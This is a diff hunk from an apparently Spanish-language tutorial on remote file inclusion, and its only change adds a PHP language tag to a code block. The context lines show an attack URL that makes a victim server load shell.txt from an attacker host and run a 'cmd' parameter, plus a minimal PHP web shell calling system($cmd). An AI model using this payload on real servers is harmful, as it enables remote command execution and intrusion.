@@ -53,7 +53,7 @@ El atacante (Nosotros) podriamos obtener una Shell en el servidor vulnerable med
 http://[servidor_victima]/index.php?page=http://[servidor_atacante]/shell.txt&&cmd=ls
 
 Pudiendo contener el archivo shell.txt cualquier código, por ejemplo:
-{% highlight %}
+{% highlight php %}
 <?php
   system($cmd);
 ?>
